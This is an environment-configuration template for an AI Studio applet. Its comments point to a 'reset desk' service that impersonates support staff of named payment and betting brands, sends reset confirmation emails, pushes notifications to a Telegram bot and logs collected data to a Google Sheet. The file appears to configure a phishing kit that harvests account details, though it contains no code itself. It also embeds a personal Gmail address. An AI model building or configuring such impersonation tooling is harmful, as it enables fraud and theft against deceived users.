# GEMINI_API_KEY: Required for Gemini AI API calls.
# AI Studio automatically injects this at runtime from user secrets.
GEMINI_API_KEY="MY_GEMINI_API_KEY"

# APP_URL: The URL where this applet is hosted.
APP_URL="MY_APP_URL"

# Company Name to display in SMS/Email templates (e.g. Nagad88 Support, Babu88 Security, Official Game Desk):
COMPANY_NAME="Official Reset Desk"

# Admin Gmail that sends confirmation messages to user Gmail and receives reset notifications:
ADMIN_GMAIL="sflove087@gmail.com"
GMAIL_USER="sflove087@gmail.com"

# 16-character Google App Password from https://myaccount.google.com/apppasswords :
GMAIL_APP_PASSWORD=
ADMIN_GMAIL_APP_PASSWORD=

# Telegram Notification Bot Configuration:
# 1. Create a bot using @BotFather on Telegram to get your TELEGRAM_BOT_TOKEN
# 2. Get your numeric Chat ID from @userinfobot or @raw_data_bot on Telegram
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=

# Google Sheets Webhook Integration (Automatic data logging into Google Sheet):
# Deploy Google Apps Script Web App from your Sheet (Extensions > Apps Script) and paste URL here:
GOOGLE_SHEET_WEBHOOK_URL=
